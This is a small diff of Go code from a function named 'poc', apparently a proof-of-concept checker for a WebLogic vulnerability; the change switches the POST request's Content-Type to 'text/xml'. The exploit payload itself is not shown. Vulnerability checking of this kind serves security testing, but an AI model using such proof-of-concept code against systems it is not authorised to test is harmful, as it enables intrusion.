@@ -44,7 +44,7 @@ func poc(server_addr string) {
 	}
 	request, err := http.NewRequest("POST", url, strings.NewReader(post_str))
 	request.Header.Set("User-Agent", "ceshi/0.0.1")
-	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	request.Header.Set("Content-Type", "text/xml")
 	if err != nil {
 		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
 		return
